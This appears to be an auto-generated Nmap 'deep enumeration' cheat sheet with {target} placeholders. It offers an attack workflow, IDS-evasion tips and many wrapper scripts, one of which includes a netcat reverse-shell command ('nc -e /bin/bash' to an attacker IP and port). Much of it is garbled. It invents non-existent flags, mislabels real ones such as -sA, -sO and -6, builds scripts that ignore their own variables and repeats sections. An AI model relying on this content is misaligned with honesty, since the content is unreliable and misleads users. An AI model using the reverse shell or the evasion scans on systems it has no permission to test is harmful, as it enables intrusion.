# Nmap Deep Enumeration ({target})

Scan beyond the open ports. Expose services, versions, and running applications through aggressive protocol enumeration and OS fingerprinting.

## Attack Workflow

1.  **Stealth Recon**: Identify live hosts and open ports without alerting IDS.
2.  **Service Detection**: Resolve open ports to specific services and versions.
3.  **OS Fingerprinting**: Identify the host operating system.
4.  **Port Scanning (Full)**: Enumerate all ports, open, closed, and filtered.
5.  **Protocol Detection**: Deep dive into TCP/IP headers.
6.  **Host Discovery**: Discover subnets, networks, and adjacent hosts.
7.  **Version Fingerprinting**: Extract detailed software versions.
8.  **Traceroute**: Map network hops and find the bottleneck.

## Commands Section

### Initial Stealth Scan
Identify live hosts and open ports silently.
```bash
nmap -sL -sC -sV --min-rate 1000 --script=default {target}
```

### Aggressive Service Enumeration
Resolve open ports to services and versions.
```bash
nmap -sC -sV -O -v -T4 --open --script=vuln {target}
```

### OS Fingerprinting
Guess the operating system.
```bash
nmap -O -sV --osg-v46 {target}
```

### Full Port Enumeration
Scan all ports (open, closed, filtered).
```bash
nmap -sS -T4 -p- --script=vuln {target}
```

### Protocol Detection
Deep scan TCP/IP headers.
```bash
nmap -sP -p- --script=vuln {target}
```

### Host Discovery
Find subnets, networks, and adjacent hosts.
```bash
nmap -sL -sP {target}
```

### Version Fingerprinting
Get detailed version info.
```bash
nmap --version-intensity high -p- {target}
```

### Traceroute
Map network hops and find the bottleneck.
```bash
nmap -T4 -sV -M --traceroute -p- --script=vuln {target}
```

## Tips & Shortcuts

*   `-sS` (SYN Scan): Best for stealth.
*   `-sA` (Acute Scan): Non-stealth, but faster.
*   `-sC` (Default Scan): Runs scripts automatically.
*   `-sV` (Service Scan): Resolves ports to services.
*   `-sO` (ICMP Scan): Ping scan.
*   `-O` (OS Scan): OS fingerprinting.
*   `-T4` (Aggressive Timing): Faster scans.
*   `-T1` (Slow Timing): Avoid IDS detection.
*   `-p-` (All Ports): Scan all 65535 ports.
*   `-p1-1000` (Range): Specific port range.
*   `--script=default`: Default scripts.
*   `--script=vuln`: Vulnerability scripts.
*   `-sN` (Null Scan): No flag to avoid alerting.
*   `--data-length` (TCP): Specify data length to probe ports.
*   `--min-rate` (Speed): Adjust scan speed to avoid IDS.
*   `--min-software-version` (Software): Minimum software version to detect.
*   `-n` (Hostnames): Don't resolve DNS.
*   `-4` (TCP): Only scan IPv4.
*   `-6` (UDP): Only scan IPv6.

## Common Mistakes

*   **Ignoring `-T1`**: High timing (-T4) can trigger IDS on some networks.
*   **Scanning Too Fast**: High scan rates can cause false negatives or alerts.
*   **Missing `-sS`**: SYN scans are faster and stealthier than TCP Connect.
*   **Scanning Closed Ports**: Use `-sP` to find live hosts before scanning.
*   **Ignoring `-n`**: DNS resolution can leak info to the target.
*   **No `-sC`**: Default scans can miss useful scripts.
*   **Not Using `-p-`**: Only scanning common ports (1-1000) misses rare ports.
*   **Missing `-O`**: OS fingerprinting is crucial for attack planning.
*   **Ignoring `-T4`**: Aggressive timing is needed for speed.

## Mini Automation Scripts

### Bash Script: Deep Nmap Scan
Automates a full deep scan with timing adjustments.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sL -sC -sV --min-rate 1000 --script=default -O -T4 {target}
```

### Python Script: Nmap Wrapper
Adds custom scripts to the nmap scan.
```python
#!/usr/bin/env python3
import subprocess
import sys

def run_nmap(target, scripts):
    cmd = ["nmap", "-sC", "-sV", "-T4", "-p-", f"--script={','.join(scripts)}", target]
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "{target}"
    scripts = ["vuln", "safe", "http-headers"]
    run_nmap(target, scripts)
```

### Bash Script: Port Range Scanner
Scans a specific port range.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
START="${2:-1}"
END="${3:-1024}"
nmap -sS -T4 -p${START}-${END} --script=vuln {target}
```

### Bash Script: Subnet Scanner
Finds live hosts in a subnet.
```bash
#!/bin/bash
SUBNET="${1:-192.168.1.0/24}"
nmap -sL -sC -sV --min-rate 1000 --script=default -O -T4 -p- {SUBNET}
```

### Bash Script: Reverse Shell via Nmap
Uses Nmap to get a reverse shell.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
REVERSE_IP="${2:-127.0.0.1}"
PORT="${3:-8080}"
nmap -sS -T4 -p- --script=vuln {target}
# Then use nc -e /bin/bash <reversing_ip> <port>
```

### Bash Script: Service Discovery
Identifies services and versions.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sC -sV -O -v -T4 --open --script=vuln {target}
```

### Bash Script: Port Scanner
Scans all ports.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sS -T4 -p- --script=vuln {target}
```

### Bash Script: Host Discovery
Finds subnets, networks, and adjacent hosts.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sL -sP {target}
```

### Bash Script: OS Fingerprinting
Guesstims the operating system.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -O -sV --osg-v46 {target}
```

### Bash Script: Full Port Enumeration
Scans all ports (open, closed, filtered).
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sS -T4 -p- --script=vuln {target}
```

### Bash Script: Protocol Detection
Deep scan TCP/IP headers.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sP -p- --script=vuln {target}
```

### Bash Script: Host Discovery
Finds subnets, networks, and adjacent hosts.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -sL -sP {target}
```

### Bash Script: Version Fingerprinting
Get detailed version info.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap --version-intensity high -p- {target}
```

### Bash Script: Traceroute
Map network hops and find the bottleneck.
```bash
#!/bin/bash
TARGET="${1:-{target}}"
nmap -T4 -sV -M --traceroute -p- --script=vuln {target}
```